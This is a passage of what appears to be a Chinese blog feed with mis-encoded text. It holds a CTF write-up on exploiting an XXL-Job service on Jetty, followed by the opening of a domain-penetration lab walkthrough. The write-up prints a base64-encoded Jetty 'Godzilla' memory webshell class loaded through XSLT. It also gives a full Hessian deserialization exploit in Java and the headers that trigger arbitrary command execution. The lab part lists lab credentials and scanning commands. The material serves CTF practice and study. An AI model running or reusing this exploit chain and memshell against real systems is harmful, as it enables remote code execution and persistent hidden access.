AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAOZ2V0SHR0cENoYW5uZWwBACgoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENoYW5uZWw7AQAkb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDaGFubmVsAQAJZ2V0U2VydmVyAQAjKClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1NlcnZlcjsBAB9vcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvU2VydmVyAQAKZ2V0SGFuZGxlcgEAJCgpTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAEWphdmEvbGFuZy9Cb29sZWFuAQAWKFopTGphdmEvbGFuZy9Cb29sZWFuOwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAC2dldEhhbmRsZXJzAQAlKClbTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAC3NldEhhbmRsZXJzAQAmKFtMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0hhbmRsZXI7KVYBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQCAAIgAAAAEAAAAiQCKAAAAAACLAIoAAAAAAIwAigAAAAAAjQCOAAAACgAJAIwAjwABAJAAAACnAAQAAwAAADABTBIBuAACTSwqtgADAyq2AAS2AAW7AAZZBCy2AAe3AAgQELYACbYACkynAARNK7AAAQACACoALQALAAMAkQAAAB4ABwAAAB4AAgAhAAgAIgAVACMAKgAlAC0AJAAuACYAkgAAACAAAwAIACIAkwCUAAIAAAAwAJUAigAAAAIALgCWAIoAAQCXAAAAEwAC/wAtAAIHAJgHAJgAAQcAmQAAAQCaAJsAAQCQAAAAdQADAAEAAAA3KrcADCoSDbUADioS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&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;com.xxl.job.core.JettyGodzillaMemshell&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸€å®šè¦è®°å¾—defineClassçš„ç±»åè¦æ”¹å•Šï¼Œä¸ç„¶å°±æŠ¥é”™äº†ï¼Œä¸€å¼€å§‹å¿˜æ”¹äº†æ‰“äº†å¥½ä¹…éƒ½æ²¡é€šğŸ˜­ï¼Œç„¶åå»å‰é¢è¯•äº†ä¸€ä¸‹apiçš„æœªæˆæƒï¼Œä¹Ÿæ˜¯æ²¡å†™å¯¹ç±»åå¯¼è‡´çš„ğŸ˜­æµªè´¹æˆ‘å¥½å¤šæ—¶é—´</p></blockquote><p>ç„¶åå°±æ˜¯ä¸€æŠŠæ¢­payloadæ‰“ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-comment">//å‘é€postè¯·æ±‚ï¼Œå› ä¸ºHessianè¦å‘é€åŸç”Ÿçš„åºåˆ—åŒ–æ•°æ®</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postExp</span><span class="hljs-params">(String url1,<span class="hljs-type">byte</span>[] poc)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆ›å»ºurlå¯¹è±¡</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚æ–¹æ³•ä¸º POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// è®¾ç½®è¯·æ±‚å¤´</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// å…è®¸è¾“å‡º</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚ä½“</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// è·å–å“åº”ç </span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// å…³é—­è¿æ¥</span><br>        connection.disconnect();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadXslt</span><span class="hljs-params">(String url, String xsltFilePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//å»ä¿®æ”¹è¿™é‡Œå†™å…¥çš„æ–‡ä»¶åï¼Œä»¥åŠæ–‡ä»¶å†…å®¹</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAttack</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9å¯ä»¥æ¢æˆMimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//è§£æxsltæ–‡ä»¶ç”Ÿæ•ˆ</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>&#125;&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//å…ˆå°†ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶ä¸º67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//ç„¶åå°†dataå¤åˆ¶åˆ°åé¢</span><br>        postExp(url,poc);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        String url=<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>;<br>        uploadXslt(url, <span class="hljs-string">&quot;payload.xslt&quot;</span>);<br>        doAttack(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172043678.png" alt="image-20241128172043678"></p><p>ç„¶åè¯·æ±‚å¤´x-fuck-dataä¸ºcmdæ—¶å°±å¯ä»¥ç›´æ¥ä»»æ„å‘½ä»¤äº†</p><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">x-fuck-data</span><span class="hljs-punctuation">: </span>cmd<br><span class="hljs-attribute">cmd</span><span class="hljs-punctuation">: </span>ls /<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241128172129357.png" alt="image-20241128172129357"></p><p>æƒ³ç”¨å“¥æ–¯æ‹‰å»è¿æ¥çš„ï¼Œä½†æ˜¯è¿ä¸ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>æƒ³è¯•ä¸€ä¸‹å†°èé©¬çš„ï¼Œä½†æ˜¯æ‰“è¿›å»è¿ä¸ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å’ŒHandlerçš„æœºåˆ¶æœ‰å…³ï¼ŒJettyè¿™å—è¿˜ä¸å¤ªç†Ÿï¼Œæœ‰æœºä¼šå†ç ”ç©¶</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/ph4nt0mer/p/13913252.html">https://www.cnblogs.com/ph4nt0mer/p/13913252.html</a></p><p><a href="https://forum.butian.net/share/2592">https://forum.butian.net/share/2592</a></p><p><a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p><a href="https://blog.csdn.net/2301_79724395/article/details/141229224">https://blog.csdn.net/2301_79724395/article/details/141229224</a></p><p>å®˜æ–¹wpï¼š<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/yleeg03c0ucdoac6?singleDoc#zB42G</a></p>]]></content>
      
      
      <categories>
          
          <category> é¢˜ç›®å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœºå››</title>
      <link href="/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/"/>
      <url>/2024/11/15/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºå…¼å®¹æ€§å·²ç»ä¼¼äº†ä¸¤ä¸ªé¶åœºï¼Œæ±‚æ±‚ä½ åˆ«ä¼¼äº†</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ VMnet0å’ŒVMnet1éƒ½æ˜¯ä»…ä¸»æœºæ¨¡å¼</p><p><img src="https://cdn.clown2024.cn/image-20241115220741988.png" alt="image-20241115220741988"></p><p><strong>webé¶æœº</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221245366.png" alt="image-20241115221245366"></p><p><strong>win7</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221326010.png" alt="image-20241115221326010"></p><p><strong>DC</strong></p><p><img src="https://cdn.clown2024.cn/image-20241115221401258.png" alt="image-20241115221401258"></p><h2 id="é¶åœºæ‹“æ‰‘å›¾"><a href="#é¶åœºæ‹“æ‰‘å›¾" class="headerlink" title="é¶åœºæ‹“æ‰‘å›¾"></a>é¶åœºæ‹“æ‰‘å›¾</h2><p><img src="https://cdn.clown2024.cn/image-20241115221119472.png" alt="image-20241115221119472"></p><p>æˆ‘ä»¬å¯åŠ¨ä¹‹åè¦å»webé¶æœºé‡Œé¢å¯åŠ¨ä¸‰ä¸ªå®¹å™¨æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241115222514020.png" alt="image-20241115222514020"></p><p>æˆ‘ä»¬å¯åŠ¨å‰ä¸‰ä¸ªå®¹å™¨æœåŠ¡å³å¯</p><p>ç„¶åæˆ‘ä»¬çš„æ”»å‡»æœºè‡ªç„¶ä¹Ÿè¦åœ¨VMnet0çš„ç½‘æ®µ</p><blockquote><p>å¥½æ¬¸é¶æœºç»ˆäºæ´»äº†ä¸€æ¬¡äº†ğŸ˜­</p></blockquote><h2 id="æœºå™¨å¯†ç "><a href="#æœºå™¨å¯†ç " class="headerlink" title="æœºå™¨å¯†ç "></a>æœºå™¨å¯†ç </h2><ul><li>ubuntu:ubuntu <strong>åŸŸæˆå‘˜æœºå™¨</strong></li><li>douser:Dotest123 <strong>DC</strong></li><li>administrator:Test2008ï¼ˆæ”¹æˆ Admin123 å› ä¸ºè¿‡æœŸäº†ï¼‰</li></ul><h1 id="è€ƒç‚¹æè¿°"><a href="#è€ƒç‚¹æè¿°" class="headerlink" title="è€ƒç‚¹æè¿°"></a>è€ƒç‚¹æè¿°</h1><p>æœ¬æ¬¡é¶åœºæ¸—é€<strong>ååºåˆ—åŒ–æ¼æ´ã€å‘½ä»¤æ‰§è¡Œæ¼æ´ã€Tomcatæ¼æ´ã€MSç³»åˆ—æ¼æ´ã€ç«¯å£è½¬å‘æ¼æ´ã€ä»¥åŠåŸŸæ¸—é€</strong>ç­‰å¤šç§ç»„åˆæ¼æ´</p><p><strong>é¶åœºå­¦ä¹ è·¯å¾„ï¼Œå¯å‚è€ƒ</strong></p><ul><li>stæ¼æ´åˆ©ç”¨</li><li>phpmyadmin getshell</li><li>tomcat æ¼æ´åˆ©ç”¨</li><li>dockeré€ƒé€¸</li><li>ms14-068</li><li>sshå¯†é’¥åˆ©ç”¨</li><li>æµé‡è½¬å‘</li><li>å†å²å‘½ä»¤ä¿¡æ¯æ³„éœ²</li><li>åŸŸæ¸—é€</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å…ˆç”¨arp-scanæ‰«ä¸€ä¸‹åŒä¸€ç½‘æ®µå†…çš„ä¸»æœºï¼ŒæŒ‡å®šå¯¹åº”çš„ç½‘å¡æ¥å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp-scan -I eth1 -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115223747881.png" alt="image-20241115223747881"></p><p>é‚£å¯ä»¥å¾—çŸ¥192.168.157.128å°±æ˜¯æˆ‘ä»¬çš„å¤–ç½‘webé¶æœº</p><p>æ¥ä¸‹æ¥ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sT -sV 192.168.157.128<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸‹é¢çš„æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code 